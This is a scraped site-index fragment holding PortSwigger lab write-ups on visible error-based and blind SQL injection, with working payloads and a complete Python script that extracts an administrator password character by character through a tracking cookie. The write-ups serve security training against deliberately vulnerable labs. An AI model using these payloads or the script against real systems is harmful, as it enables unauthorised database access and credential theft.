  document.addEventListener("keydown", function (e) {

    if (document.activeElement.tagName == "INPUT") {

</script>


<script defer>
  function throttle(fn, wait) {
    var time = Date.now();
    return function () {
      var now = Date.now()
      if (time + wait - now < 0) {
        fn();
        time = now;
      }
    };
  }

  function scrollHandler() {
    const anchors = Array.from(document.querySelectorAll("body h2, body h3"));

    function scrollCallback() {
      var scrollTop = window.pageYOffset || document.documentElement.scrollTop;

      
      for (var i = 0; i < anchors.length; i++) {
        var anchorId = anchors[i].getAttribute("id");
        var link = document.querySelector(
          'nav ul li a[href="#' + anchorId + '"]',
        );
        if (link) {
          link.classList.remove("active-toc");
        }
      }

      
      for (var i = anchors.length - 1; i >= 0; i--) {
        var offsetTop = anchors[i].offsetTop;
        if (scrollTop > offsetTop - 75) {
          var anchorId = anchors[i].getAttribute("id");
          var link = document.querySelector(
            'nav ul li a[href="#' + anchorId + '"]',
          );
          if (link) {
            link.classList.add("active-toc");
            break;
          }
        }
      }
    }

    window.addEventListener(
      "scroll",
      throttle(scrollCallback, 200),
    );
  }
  setTimeout(scrollHandler, 100);
</script>


<script defer>
  function addCopyButtonToCodeBlocks() {
    const codeBlocks = document.querySelectorAll('code[class^="language-"]');

    codeBlocks.forEach((codeBlock) => {
      const copyButton = document.createElement("button");
      copyButton.classList.add("copy-code-button");
      copyButton.innerHTML = "copy";

      copyButton.addEventListener("click", () => {
        const elements = codeBlock.querySelectorAll(".cl");
        let codeToCopy = "";
        elements.forEach((element) => {
          codeToCopy += element.innerText;
        });
        navigator.clipboard.writeText(codeToCopy);

        copyButton.innerHTML = "copied!";
        setTimeout(() => {
          copyButton.innerHTML = "copy";
        }, 1500);
      });

      codeBlock.parentNode.before(copyButton);
    });
  }
  setTimeout(function () {
    addCopyButtonToCodeBlocks();
  }, 100);
</script>


<script defer>
document.addEventListener("DOMContentLoaded", function() {
    function replaceSymbolsWithFormatting(node) {
        
        if (node.parentNode && (
            node.parentNode.nodeName === 'PRE' || 
            node.parentNode.nodeName === 'CODE' ||
            node.parentNode.closest('pre') || 
            node.parentNode.closest('code')
        )) {
            return;
        }

        if (node.nodeType === 3) { 
            const text = node.nodeValue;
            if (text.includes('+') && text.indexOf('+') !== text.lastIndexOf('+')) {
                const newText = text.replace(/\+([^+]+)\+/g, '<span class="highlight">$1</span>');
                const span = document.createElement('span');
                span.innerHTML = newText;
                node.parentNode.replaceChild(span, node);
            }
        } else if (node.nodeType === 1 && !['SCRIPT', 'STYLE', 'TEXTAREA'].includes(node.tagName)) {
            Array.from(node.childNodes).forEach(replaceSymbolsWithFormatting);
        }
    }

    Array.from(document.body.childNodes).forEach(replaceSymbolsWithFormatting);
});
</script>

        "tags": ["WebSecurity","PortSwigger","web-exploitation","security-research","portswigger-labs","ctf-writeup","injection","sql","sqli","python","errors",],
        "content": "Lab 11: Visible error-based SQL injection: This lab contains a SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie. The results of the SQL query are not returned.\nThe database contains a different table called users, with columns called username and password. To solve the lab, find a way to leak the password for the administrator user, then log in to their account.\nInitial Reconnaissance/Discovery: Standard shop Establishing SQLi: We know the lab is vulnerable to SQLi in the trackingId cookie however let\u0026rsquo;s validate this manually.\nBy adding a single quotation ' the underlying SQL query is no longer valid and therefore causes and error, returning a 500 response. If we comment out the remainder of the query after our single quotation mark or close our single quote with another single quote we can see that the query is valid once again and we receive a 200 response.\n\u0026#39;-- \u0026#39;\u0026#39; Creating Subquery \u0026amp; Detecting The type of Database In Use: So now that we know that the TrackingId is susceptible to\nIn order to do this we will need to add a subquery we can do this with string concatenation operators. If we check the SQL Cheat Sheet https://portswigger.net/web-security/sql-injection/cheat-sheet we can see the below.\nPostgreSQL \u0026#39;foo\u0026#39;||\u0026#39;bar\u0026#39; Microsoft \u0026#39;foo\u0026#39;+\u0026#39;bar\u0026#39; Oracle \u0026#39;foo\u0026#39;||\u0026#39;bar\u0026#39; MySQL \u0026#39;foo\u0026#39; \u0026#39;bar\u0026#39; [Note the space between the two strings] CONCAT(\u0026#39;foo\u0026#39;,\u0026#39;bar\u0026#39;) We can use a simple SELECT statement as the subquery.\nPostgreSQL \u0026#39;|| (SELECT \u0026#39;\u0026#39;)||\u0026#39; Microsoft \u0026#39;+(SELECT \u0026#39;\u0026#39;)+\u0026#39; Oracle \u0026#39;|| (SELECT \u0026#39;\u0026#39; FROM DUAL)||\u0026#39; MySQL \u0026#39; (SELECT \u0026#39;\u0026#39;) \u0026#39; +Note+: Remember unlike other database systems (like MySQL or PostgreSQL), Oracle SQL syntax requires a FROM clause in every SELECT statement \u0026amp; this is why we use the inbuilt DUAL table.\nWe can put these payloads into intruder. Looking at the results we can see it is a PostgreSQL database in use. So now we know what type of database is in use, how exactly are we going to extract data from it?\nTriggering An Error To Read The Underlying SQL Query: So now we have determined the database type we now know what is syntactically correct, meaning we can intentionally cause and error to see if we can glean any further information.\nIf we drop a quotation mark from our payload so that is:\n\u0026#39;|| (SELECT \u0026#39;)||\u0026#39; We get the below response Which shows us part of the query being ran is.\nSELECT * FROM tracking WHERE id = \u0026#39;[TrackingId]\u0026#39; CAST() Function: For this we can use the CAST() Function. The CAST() function enables us to convert data types. However if we try and convert one data type to incompatible one, e.g. string data from a password column into an integer it will trigger and error, which in turn could display more useful information by way of the error message.\nCAST((SELECT passwords FROM users) AS int) Now we know what the CAST() function does we can use it to trigger errors.\nUsing The CAST() Function To Trigger Informational Errors: We know part of the underlying query being ran on the database is.\nSELECT * FROM tracking WHERE id = \u0026#39;[TrackingId]\u0026#39; This means we can append an additional query using AND as in theory the fully query should be something to the effect of:\nSELECT * FROM tracking WHERE id = \u0026#39;[TrackingId]\u0026#39; AND x = \u0026#39;[value]\u0026#39; +This part is really important+: After WHERE ... AND, the database must get a condition, something that can be evaluated as true or false e.g. a boolean condition. This is because SQL needs to decide whether the row matches the WHERE clause another example would be.\nSELECT * FROM tracking WHERE id = \u0026#39;[TrackingId]\u0026#39; AND username = \u0026#39;administrator\u0026#39; To make this simple here are some examples of valid things after AND (boolean).\nAND 1=1 AND username = \u0026#39;admin\u0026#39; AND age \u0026gt; 20 AND CAST(...) \u0026gt; 0 Here are some examples of invalid things after AND (non-boolean)\nAND 1 AND \u0026#39;hello\u0026#39; AND CAST((SELECT 1) AS int) To demonstrate this we can use the below payloads.\n\u0026#39; AND CAST((SELECT 1) as int)-- Non boolean so will error \u0026#39; AND 1=CAST((SELECT 1) as int)-- Boolean so will not error Non boolean payload which gives us the message \u0026ldquo;ERROR: argument of AND must be type boolean, not type integer Position: 63\u0026rdquo; Valid boolean condition. +Note+: If you\u0026rsquo;re wondering why this payload is valid it essentially just resolves to 1=1 as we are saying the whole of the CAST() query 1=, which just outputs the integer value 1 due to (SELECT 1) as int, is equal to 1.\nOkay…but how does this help us….well as the database leaks information via it\u0026rsquo;s error messages and we are able to intentionally trigger error messages we may be able to intentionally leak data by causing errors.\nExtracting The Administrator\u0026rsquo;s Password Using CAST(): In labs description we know we need to leak the administrators password which is contained in the password column in the users database.\nIf we enter the payload below.\n\u0026#39; AND 1=CAST((SELECT username from users) as int)-- We can see we get an error, however it\u0026rsquo;s not the type of error we expect.\nTypically with this payload we should get an error telling us that more one row is being returned by the subquery, due to the fact that the returned value of the subquery (all the usernames in the users table) will be greater than 1, so therefore 1 is not equal 1 and a False condition is returned. However with the error we can see that our subquery is cut off so reads.\n\u0026#39; AND 1=CAST((SELECT username from users) as It also shows \u0026ldquo;unterminated string literal\u0026rdquo;, which is a fancy way of saying, this query is not closed, so we can infer that our full payload is being cut off.\nIf we remove the trackingId value entirely we can see our query resolves as expected. This means we have to work within character constraints of the application and can\u0026rsquo;t run a simple query like, which would have been nice.\nAND 1=CAST((SELECT password where username=\u0026#39;administrator\u0026#39;) as int)-- Using LIMIT To Return The Administrators Password: As we are limited to outputting a single row we can modify our previous query to the below.\n\u0026#39; AND 1=CAST((SELECT username from users LIMIT 1) as This shows us the first entry in the table which just so happens to be the administrator. We can further modify that query to then display the corresponding password.\n\u0026#39; AND 1=CAST((SELECT password from users LIMIT 1) as We can then login. ",

        "title": "SQLi Vulnerabilities: Lab 10: Blind SQL injection with conditional errors",
        "tags": ["WebSecurity","PortSwigger","web-exploitation","security-research","portswigger-labs","ctf-writeup","injection","sql","sqli","python","blind","conditional","errors",],
        "content": "Lab 10: Blind SQL injection with conditional errors: This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie.\nThe results of the SQL query are not returned, and the application does not respond any differently based on whether the query returns any rows. If the SQL query causes an error, then the application returns a custom error message.\nThe database contains a different table called users, with columns called username and password. You need to exploit the blind SQL injection vulnerability to find out the password of the administrator user.\nTo solve the lab, log in as the administrator user.\nInitial Reconnaissance/Discovery: We have access to the standard lab shop front. Establishing SQLi: We know the lab is vulnerable to SQLi in the trackingId cookie however let\u0026rsquo;s validate this manually.\nBy adding a single quotation ' the underlying SQL query is no longer valid and therefore causes and error, returning a 500 response. If we comment out the remainder of the query after our single quotation mark or close our single quote with another single quote we can see that the query is valid once again and we receive a 200 response.\n\u0026#39;-- \u0026#39;\u0026#39; Creating Subquery \u0026amp; Detecting The type of Database In Use: So now that we know about CASE Expressions and divide by zero errors we start asking the database questions.\nIn order to do this we will need to add a subquery we can do this with string concatenation operators. If we check the SQL Cheat Sheet https://portswigger.net/web-security/sql-injection/cheat-sheet we can see the below.\nPostgreSQL \u0026#39;foo\u0026#39;||\u0026#39;bar\u0026#39; Microsoft \u0026#39;foo\u0026#39;+\u0026#39;bar\u0026#39; Oracle \u0026#39;foo\u0026#39;||\u0026#39;bar\u0026#39; MySQL \u0026#39;foo\u0026#39; \u0026#39;bar\u0026#39; [Note the space between the two strings] CONCAT(\u0026#39;foo\u0026#39;,\u0026#39;bar\u0026#39;) We can use a simple SELECT statement as the subquery.\nPostgreSQL \u0026#39;|| (SELECT \u0026#39;\u0026#39;)||\u0026#39; Microsoft \u0026#39;+(SELECT \u0026#39;\u0026#39;)+\u0026#39; Oracle \u0026#39;|| (SELECT \u0026#39;\u0026#39; FROM DUAL)||\u0026#39; MySQL \u0026#39; (SELECT \u0026#39;\u0026#39;) \u0026#39; +Note+: Remember unlike other database systems (like MySQL or PostgreSQL), Oracle SQL syntax requires a FROM clause in every SELECT statement \u0026amp; this is why we use the inbuilt DUAL table.\nWe can put these payloads into intruder. Looking at the results we can see it is an Oracle database in use. So now we know what type of database is in use, how exactly are we going to extract data from it?\nCASE/CASE When Expressions: To understand how we are going to extract data you need to have some basic understanding of the CASE/CASE WHEN expressions in SQL otherwise this will work but you won\u0026rsquo;t know why it works.\nSimple CASE Expression: The CASE expression evaluates conditions in order and returns the result from the first WHEN clause whose condition is True.\nIt works basically like an if → elseif → else chain in programming languages. This means as soon as one condition is True, SQL stops evaluating any further conditions or branches. If none of the WHEN conditions are True, SQL returns the value in the ELSE clause. If there is no ELSE, SQL returns NULL.\nHere is a example of a \u0026ldquo;simple CASE\u0026rdquo; Expression:\nSELECT order_id, status_code, CASE status_code WHEN 1 THEN \u0026#39;Pending\u0026#39; --\u0026lt;Branch1 WHEN 2 THEN \u0026#39;Paid\u0026#39; --\u0026lt;Branch2 WHEN 3 THEN \u0026#39;Shipped\u0026#39; --\u0026lt;Branch3 WHEN 4 THEN \u0026#39;Cancelled\u0026#39; --\u0026lt;Branch4 ELSE \u0026#39;Unknown\u0026#39; --\u0026lt;Branch5 END AS status_text FROM Orders; So if the status_code for the order is 2 this would resolve to True and the rest of the expression would not be evaluated.\n+Note+: This is called a \u0026ldquo;simple CASE expression\u0026rdquo; because the expression after CASE is being compared directly to specific values.\nSearched CASE Expression: A \u0026ldquo;Searched CASE expression\u0026rdquo; is the most common form of CASE the difference between this and a \u0026ldquo;simple CASE expression\u0026rdquo; is this allows us to write arbitrary boolean conditions for each branch of the expression. So instead of comparing against specific values we can say when condition x is met then this is the result. It follows the same logic as before, in that once the first True condition is met no other branches are evaluated.\nCASE WHEN condition1 THEN result1 WHEN condition2 THEN result2 ELSE resultN END Here is a simple example demonstrating how it works.\nCASE WHEN 1 = 1 THEN \u0026#39;True\u0026#39; --\u0026lt;-Branch1 WHEN 1 = 2 THEN \u0026#39;False\u0026#39; --\u0026lt;-Branch2 WHEN 1/0 THEN \u0026#39;Error\u0026#39; --\u0026lt;-Branch3 ELSE \u0026#39;Fallback\u0026#39; --\u0026lt;-Branch4 END; In the above example the first condition 1 = 1 is True so it will return 'True'. Because of this no other branches are evaluated.\nOkay, got the above…..good.\nIntentional Errors VIA Divide By Zero: A simple way to trigger an error is to cause a divide by zero error. As it is not possible to divide by zero this is a reliable way to ALWAYS trigger an error if we need one….but why do we need an error? Well if we want an error to only trigger when certain condition is met e.g. a character of a password is evaluated we can use this error signal as a mechanism to tell us something is True\nExample 1: True Condition\n( SELECT CASE WHEN (1=1) -- Boolean condition == TRUE THEN TO_CHAR(1/0) -- Branch taken → triggers error ELSE \u0026#39;\u0026#39; -- Not evaluated END FROM dual ) #+end_src Because 1=1 is True, SQL takes the first branch of the CASE expression.\nTO_CHAR(1/0) runs. This immediately triggers a division-by-zero error. The request therefore breaks with an Oracle error — which gives us a reliable TRUE signal during error-based blind SQLi. Payload being run in the lab:\n\u0026#39;|| (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE \u0026#39;\u0026#39; END FROM dual)||\u0026#39; Example 2: False Condition\n( SELECT CASE WHEN (1=2) -- Boolean condition == FALSE THEN TO_CHAR(1/0) -- Not evaluated → no error. ELSE \u0026#39;\u0026#39; -- Branch taken → safe value returned END FROM dual ) Because 1=2 is False, SQL skips the error-triggering branch entirely.\nThe THEN TO_CHAR(1/0) block is never run → no error is thrown. The ELSE branch returns a harmless empty string (''). The request completes cleanly, giving us a reliable FALSE signal. Payload being run in the lab:\n\u0026#39;|| (SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE \u0026#39;\u0026#39; END FROM dual)||\u0026#39; +In plain English+: If the condition is False, the dangerous code is not executed → no error. If the condition is True, the dangerous code is executed → error. This allows Boolean-based SQL injection even when errors are normally hidden.\nEnumerating Database Tables \u0026amp; Users: So now you know what \u0026ldquo;Simple CASE expressions\u0026rdquo; \u0026amp; \u0026ldquo;Search CASE expressions\u0026rdquo; as well as triggering divide by zero errors we can actually construct useful payloads to extract data.\nEnumerating The Database First lets validate the Users table exists.\n\u0026#39;||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE \u0026#39;\u0026#39; END FROM user_tables WHERE table_name = \u0026#39;USERS\u0026#39;)||\u0026#39; We get a 500 error which means True so we it does exist. We can double check this by putting in a random string to and as you can see below we get a 200 which is False. Confirming The Administrator User Exists: We can now confirm the administrator user exists in the Users table.\n\u0026#39;||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE \u0026#39;\u0026#39; END FROM users WHERE username=\u0026#39;administrator\u0026#39;)||\u0026#39; As expected we get 500 response. Solving The Lab By Enumerating The Administrators Password: Now we know the administrator user exists in the users table we can now being enumerating the password for the account.\nWe are going to use same approach as the previous lab Blind SQL injection with conditional responses (walktrhough here) where we ask a series of yes or no questions whilst iterating through a payload list of alphanumerical values using the SUBSTRING/SUBST function compare the passwords value in that position to the payload we provide which if it is a match will result in a 500 response, which we can filter for.\nWe will use the below query where we use the\n\u0026#39;||(SELECT CASE WHEN SUBSTR(password,[substringPosition],1)=\u0026#39;[value]\u0026#39; THEN TO_CHAR(1/0) ELSE \u0026#39;\u0026#39; END FROM users WHERE username=\u0026#39;administrator\u0026#39;)||\u0026#39; Using Burp: We send the request to Intruder \u0026amp; set the attack type to \u0026ldquo;Clusterbomb\u0026rdquo;.\nFor our first position (substring) we can supply a numerical list of 1-20 For our second position we supply a list of alphanumerical characters A-Z lower+uppercase as well as numbers.\nNow we start the attack.\nNext we can filter the results to show only 500 responses. As we can see we have all the characters for the password, we just need to put them in order. For my lab this resulted in this being the password: 9k2o9mjkvnfyy8m9ir1g\nWe can now login. And the lab is solved. Using Python: As usual I am going to show how this can also be solved using Python.\nPrep The Certificate: If you want to proxy traffic through burp this is mandatory.\nOpen burp\u0026rsquo;s in built web browser and go to http://burpsuite \u0026amp; download the certificate by clicking on “CA Certificate” button on the top right corner. Convert the certificate to the .pem format so the python requests module can use it.\nopenssl x509 -inform der -in certificate.cer -out certificate.pem payload.txt creation: As we need to iterate through all alphanumerical characters it is better to have a payload.txt file that contains all the characters as it\u0026rsquo;s far cleaner than having thes values hard coded. Below is a snippet of what this looks like.\nv w x y z A B C Grab The Relevant Cookies: For this to work we will need to grab the TrackingId \u0026amp; Session cookies from a request. Imports: First we import the modules we will need, requests \u0026amp; os. We also suppress the requests warning that will show.\nimport requests import os requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning) If we didn\u0026rsquo;t suppress the warnings the output would look like this. Proxy Setup: Now we declare our proxy so we can push all our traffic through burp, we also pass in the converted certificate.\nproxy = \u0026#39;http://127.0.0.1:8080\u0026#39; os.environ[\u0026#39;HTTP_PROXY\u0026#39;] = proxy os.environ[\u0026#39;HTTPS_PROXY\u0026#39;] = proxy os.environ[\u0026#39;REQUESTS_CA_BUNDLE\u0026#39;] = \u0026#34;certificate.pem\u0026#34; Variable Declaration: Proxies \u0026amp; URL:\nWe declare an array of proxies to proxy our requests through as well as the unique url \u0026amp; category endpoint.\nproxies = {\u0026#34;http\u0026#34;: \u0026#34;http://127.0.0.1:8080\u0026#34;, \u0026#34;https\u0026#34;: \u0026#34;http://127.0.0.1:8080\u0026#34;} url=\u0026#34;https://0a3c006504052939809e08460073005d.web-security-academy.net/\u0026#34; Empty String:\nWe just need a single empty string to store the revealed password as we uncover each value.\nrevealedPass=\u0026#34;\u0026#34; Main Logic: We declare a loop that will run from position 1 to position 21.\nfor substringPosition in range(1, 21): Then we have a try block which will be used to contain the rest of our logic.\nWe open our payloads.txt file and read mode.\nwith open(\u0026#34;payload.txt\u0026#34;, \u0026#39;r\u0026#39;) as payloads: We then iterate through this file, line by line.\nfor x in payloads: We create a variable called passwordChar which is used to store the current value from our payload.txt file minus the new character symbol at the end of each line.\npasswordChar=(x.rstrip(\u0026#39;\\n\u0026#39;)) We create a payload string where we pass in the payload previous used + our substringPosition (where we are in the iterations from 1-21) as well as the passwordChar from our payload.txt file.\npayload=f\u0026#34;\u0026#39;||(SELECT CASE WHEN SUBSTR(password,{substringPosition},1)=\u0026#39;{passwordChar}\u0026#39; THEN TO_CHAR(1/0) ELSE \u0026#39;\u0026#39; END FROM users WHERE username=\u0026#39;administrator\u0026#39;)||\u0026#39;\u0026#34; We then send our request which contains the cookies TrackingId + our payload \u0026amp; the Session cookie.\nrequest=requests.get(url, proxies=proxies, verify=False, timeout=3, cookies={ \u0026#39;TrackingId\u0026#39; : \u0026#39;GKkVLtBVPDgnQj2W\u0026#39;+payload, \u0026#39;session\u0026#39; : \u0026#39;GgXHDXmJltEuxP7YgEb5dws0SojkNZBB\u0026#39; }) Response Monitoring: We then monitor the responses and filter for all 500 responses as these are our True responses.\nAdd the passwordChar value to our empty list revealedPass We will print the string \u0026quot;Password char position {substringPosition} == {passwordChar}.\u0026quot; We will then print the current contents of the revealedPass string. +Note+: I had to use the .lower() method for this to work. if request.status_code == 500: revealedPass+=passwordChar print(\u0026#34;-\u0026#34;*10) print(f\u0026#34;Password char position {substringPosition} == {passwordChar}.\u0026#34;) print(revealedPass) Full chunk:\nfor substringPosition in range(1, 21): try: with open(\u0026#34;payload.txt\u0026#34;, \u0026#39;r\u0026#39;) as payloads: for x in payloads: passwordChar=(x.rstrip(\u0026#39;\\n\u0026#39;)) payload=f\u0026#34;\u0026#39;||(SELECT CASE WHEN SUBSTR(password,{substringPosition},1)=\u0026#39;{passwordChar}\u0026#39; THEN TO_CHAR(1/0) ELSE \u0026#39;\u0026#39; END FROM users WHERE username=\u0026#39;administrator\u0026#39;)||\u0026#39;\u0026#34; request=requests.get(url, proxies=proxies, verify=False, timeout=3, cookies={ \u0026#39;TrackingId\u0026#39; : \u0026#39;GKkVLtBVPDgnQj2W\u0026#39;+payload, \u0026#39;session\u0026#39; : \u0026#39;GgXHDXmJltEuxP7YgEb5dws0SojkNZBB\u0026#39; }) if request.status_code == 500: revealedPass+=passwordChar print(\u0026#34;-\u0026#34;*10) print(f\u0026#34;Password char position {substringPosition} == {passwordChar}.\u0026#34;) print(revealedPass) Error Handling: These except clauses are used for error handling to ensure if an error is encountered they are logged to the terminal and the process continues.\nexcept requests.exceptions.HTTPError as errh: print (\u0026#34;Http Error:\u0026#34;,errh) except requests.exceptions.ConnectionError as errc: print (\u0026#34;Error Connecting:\u0026#34;,errc) except requests.exceptions.Timeout as errt: print (\u0026#34;Timeout Error:\u0026#34;,errt) except requests.exceptions.RequestException as err: print (\u0026#34;OOps: Something Else\u0026#34;,err) Full Script: #!/usr/bin/env python3 import requests import os requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning) proxy = \u0026#39;http://127.0.0.1:8080\u0026#39; os.environ[\u0026#39;HTTP_PROXY\u0026#39;] = proxy os.environ[\u0026#39;HTTPS_PROXY\u0026#39;] = proxy os.environ[\u0026#39;REQUESTS_CA_BUNDLE\u0026#39;] = \u0026#34;certificate.pem\u0026#34; proxies = {\u0026#34;http\u0026#34;: \u0026#34;http://127.0.0.1:8080\u0026#34;, \u0026#34;https\u0026#34;: \u0026#34;http://127.0.0.1:8080\u0026#34;} url=\u0026#34;https://0a3e002803b04f0e809908f400f800f3.web-security-academy.net/\u0026#34; revealedPass=\u0026#34;\u0026#34; for substringPosition in range(1, 21): try: with open(\u0026#34;payload.txt\u0026#34;, \u0026#39;r\u0026#39;) as payloads: for x in payloads: passwordChar=(x.rstrip(\u0026#39;\\n\u0026#39;)) payload=f\u0026#34;\u0026#39;||(SELECT CASE WHEN SUBSTR(password,{substringPosition},1)=\u0026#39;{passwordChar}\u0026#39; THEN TO_CHAR(1/0) ELSE \u0026#39;\u0026#39; END FROM users WHERE username=\u0026#39;administrator\u0026#39;)||\u0026#39;\u0026#34; request=requests.get(url, proxies=proxies, verify=False, timeout=3, cookies={ \u0026#39;TrackingId\u0026#39; : \u0026#39;GKkVLtBVPDgnQj2W\u0026#39;+payload, \u0026#39;session\u0026#39; : \u0026#39;GgXHDXmJltEuxP7YgEb5dws0SojkNZBB\u0026#39; }) if request.status_code == 500: revealedPass+=passwordChar print(\u0026#34;-\u0026#34;*10) print(f\u0026#34;Password char position {substringPosition} == {passwordChar}.\u0026#34;) print(revealedPass) except requests.exceptions.HTTPError as errh: print (\u0026#34;Http Error:\u0026#34;,errh) except requests.exceptions.ConnectionError as errc: print (\u0026#34;Error Connecting:\u0026#34;,errc) except requests.exceptions.Timeout as errt: print (\u0026#34;Timeout Error:\u0026#34;,errt) except requests.exceptions.RequestException as err: print (\u0026#34;OOps: Something Else\u0026#34;,err) Solving The Lab: If we run the script we can see it prints the password out character by character. And we can ensure this is correct by logging in and solving the lab. ",

        "content": "Lab 9: Blind SQL injection with conditional responses: This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie.\nThe results of the SQL query are not returned, and no error messages are displayed. But the application includes a Welcome back message in the page if the query returns any rows.\nThe database contains a different table called users, with columns called username and password. You need to exploit the blind SQL injection vulnerability to find out the password of the administrator user.\nTo solve the lab, log in as the administrator user.\nInitial Reconnaissance/Discovery: We have access to a store front. We can see that the string \u0026ldquo;Welcome Back!\u0026rdquo; is visible Establishing SQLi: From the description we know that the string \u0026ldquo;Welcome Back!\u0026rdquo; is only displayed if the query returns rows from the table. To validate this lets modify a request.\nThis is the base request and the string is visible. By adding a single quotation ' the underlying SQL query is no longer valid and therefore does not return any rows so we do not get a match. If we comment out the remainder of the query after our single quotation mark we can see that the query is valid once again and we get the \u0026ldquo;Welcome Back!\u0026rdquo; string.\n\u0026#39;-- Inferring The SQL Query Being Run: Looking at the way the page responds and can infer the query being run is similar to the below.\nSELECT TrackingId FROM TrackedUsers WHERE TrackingId = \u0026#39;[trackingID]\u0026#39; When we add our single quote it becomes the below which is syntactically incorrect.\nSELECT TrackingId FROM TrackedUsers WHERE TrackingId = \u0026#39;[trackingID]\u0026#39;\u0026#39; However when we close off the quotaion mark with a comment it becomes the below, closing off the first quotation mark we provided.\nSELECT TrackingId FROM TrackedUsers WHERE TrackingId = \u0026#39;[trackingID]\u0026#39;\u0026#39;-- Verifying The SQLi With Boolean Conditions: To ensure we are not getting a false positive let\u0026rsquo;s re-validate this SQLi using boolean logic and ensure our user input is being interpretted as SQL query.\nTo do this we can use the following payloads:\nAs we can the payload '+AND+'1'='2'-- resolves to false and therefore we do not get the \u0026ldquo;Welcome Back!\u0026rdquo; string.\n\u0026#39;+AND+\u0026#39;1\u0026#39;=\u0026#39;2\u0026#39;-- However we can see that the payload below resolves to True and therefore we can see the string.\n\u0026#39;+AND+\u0026#39;1\u0026#39;=\u0026#39;1\u0026#39;-- To get a better understanding of what is taking place under the hood we can again guess what the underlying SQL query is and append our additional query to it.\nWe can see why we are getting our True \u0026amp; False responses, as we are using an AND condition so both queries have to be True to resolve to True otherwise they will resolve to False\nSELECT TrackingId FROM TrackedUsers WHERE TrackingId = \u0026#39;[trackingID]\u0026#39; AND \u0026#39;1\u0026#39;=\u0026#39;1\u0026#39;-- SELECT TrackingId FROM TrackedUsers WHERE TrackingId = \u0026#39;[trackingID]\u0026#39; AND \u0026#39;1\u0026#39;=\u0026#39;2\u0026#39;-- The interesting thing about this too is that using this type of logic we can enumerate the database and extract information easily using yes or no queries.\nExtracting The Administrator Password Using The SUBSTRING Function: Now that we have determined we can ask the database True or False questions and that False means \u0026ldquo;Welcome Back!\u0026rdquo; is not displayed we can use this logic to extract data one character at a time. For instance we can ask \u0026ldquo;is the first character of the table t\u0026rdquo; and if we get a True response we know….well it\u0026rsquo;s True. Now it would be time consuming to ask these questions manually, however we can use burp as well as python to ask these questions.\n+Important+: The password is dynamically generated per lab instance so this may not match up with your findings but the methodology is the same.\nBase Substring query Explained: Below is the query that we will be using with both Burp \u0026amp; Python to extract data one character at a time.\n\u0026#39; AND SUBSTRING((SELECT Password FROM Users WHERE Username = \u0026#39;administrator\u0026#39;), 1, 1) = \u0026#39;[value]\u0026#39;-- We start by closing the original query with a single quote '. We then attach our injected condition using the AND operator. Next, we call the SQL SUBSTRING() function. Inside SUBSTRING(), we place our sub-query: SELECT Password FROM Users WHERE Username = 'administrator' This returns the administrator’s password as a string. The parameters (1, 1) in SUBSTRING(..., 1, 1) mean: Start at position 1 (SQL strings are 1-indexed, not 0-indexed) Extract 1 character: So we’re pulling just the first character of the administrator’s password. We then compare that character to our guessed value using = '[value]'. If our guess is correct, the condition returns True if not, False. Finally, we comment out the rest of the original query with --. What This Achieves: If we test with the value 'x' and the first character of the admin password is not 'x', the condition evaluates to False, and the page behavior changes accordingly e.g it does not show the \u0026quot;Welcome Back!\u0026quot; string. If the output matches your True condition (e.g., a successful login, a different page layout, a valid SQL response), then we know the first character is 'x'.\nBy iterating through a list of characters (a–z, A–Z, 0–9, symbols), we can brute-force the first character. Once discovered, we update the substring position to (2, 1) to extract the second character, then (3, 1), and so on until we reveal the full password.\nWhat is great about this technique is that we can use it to ask the database any question, we can use it to enumerate the database name, column names, database content, if the database user is a database admin you name it we can ask it with this approach.\nUsing Burp: First we will grab a standard request and send to repeater to ensure our query works.\nFor our initial test we are going to instead use the \u0026gt; greater than symbol instead of the = symbol. This way we can easily check if the query is returning differnet responses based on the values we provide.\n\u0026#39; AND SUBSTRING((SELECT Password FROM Users WHERE Username = \u0026#39;administrator\u0026#39;), 1, 1) \u0026gt; \u0026#39;0\u0026#39;-- As we can see we get a True response as for the first character of the administrator password being greater than 0 If we check again and set the value to 9 we can see we still get a True response. The same happens again if we put the value as a however, if we enter the value t. So we now know this approach works and the first character is greater than a but less than t. Using Intruder To Extract The Password: Now that we know this works we can send the request to intruder.\nWe will set two injection points for intruder, the first being the Substring position 1 and then the actual payload value. We will also modify the \u0026gt; to be a simple =.\nWe set the attack type to \u0026ldquo;Clusterbomb\u0026rdquo;\nThis means the payload becomes:\n\u0026#39; AND SUBSTRING((SELECT Password FROM Users WHERE Username = \u0026#39;administrator\u0026#39;), substringPosition, 1) = \u0026#39;payload\u0026#39;-- For our first position (substring) we can supply a numerical list of 1-20 For our second position we supply a list of alphanumerical characters A-Z lower+uppercase as well as numbers.\nWe then set a grep filter to match for the string \u0026ldquo;Welcome Back!\u0026rdquo; A quick glance of the results we can see we have some matches. Let\u0026rsquo;s now filter for just the results with the matcher string. We have the password now however it\u0026rsquo;s all out of order and for some reason filtering by Payload1 is not putting it in the right order, however we can easily just grab this outselves and put it into order. d81exg6zwtnucd9nnek2\nLet\u0026rsquo;s try that to login. As we can see we can \u0026amp; the lab is solved. Using Python: As usual I am going to show how this can also be solved using Python.\nPrep The Certificate: If you want to proxy traffic through burp this is mandatory.\nOpen burp\u0026rsquo;s in built web browser and go to http://burpsuite \u0026amp; download the certificate by clicking on “CA Certificate” button on the top right corner. Convert the certificate to the .pem format so the python requests module can use it.\nopenssl x509 -inform der -in certificate.cer -out certificate.pem payload.txt creation: As we need to iterate through all alphanumerical characters it is better to have a payload.txt file that contains all the characters as it\u0026rsquo;s far cleaner than having thes values hard coded. Below is a snippet of what this looks like.\nv w x y z A B C Grab The Relevant Cookies: For this to work we will need to grab the TrackingId \u0026amp; Session cookies from a request. Imports: First we import the modules we will need, requests \u0026amp; os. We also suppress the requests warning that will show.\nimport requests import os requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning) If we didn\u0026rsquo;t suppress the warnings the output would look like 